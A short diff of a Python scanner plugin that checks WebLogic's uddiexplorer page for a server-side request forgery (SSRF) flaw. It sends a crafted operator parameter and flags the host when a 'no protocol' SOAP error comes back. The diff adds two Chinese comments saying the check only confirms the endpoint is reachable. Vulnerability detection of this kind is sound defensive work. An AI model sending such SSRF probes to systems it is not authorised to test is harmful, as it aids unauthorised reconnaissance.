@@ -17,6 +17,8 @@ class P(T):
         url = arg+'uddiexplorer/SearchPublicRegistries.jsp?operator=operator=10.301.0.0:80&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search'
         code, head, res, errcode, _ = curl.curl2(url)
         # print res
+    	# because operator指定的测试ip没有设定协议，所以是no portocol，如果指定http://10.301.0.0则发挥的直接是operator=xxx.
+	# 其实这么测试，只是测试是否可以访问这个连接，并没有真正的判断是否开放端口？
         if code == 200 and 'weblogic.uddi.client.structures.exception.XML_SoapException: no protocol: operator=10.301.0.0:80' in res:
 	    cprint(arg + '存在weblogic SSRF漏洞', 'yellow')
             output(arg,result,'warning')
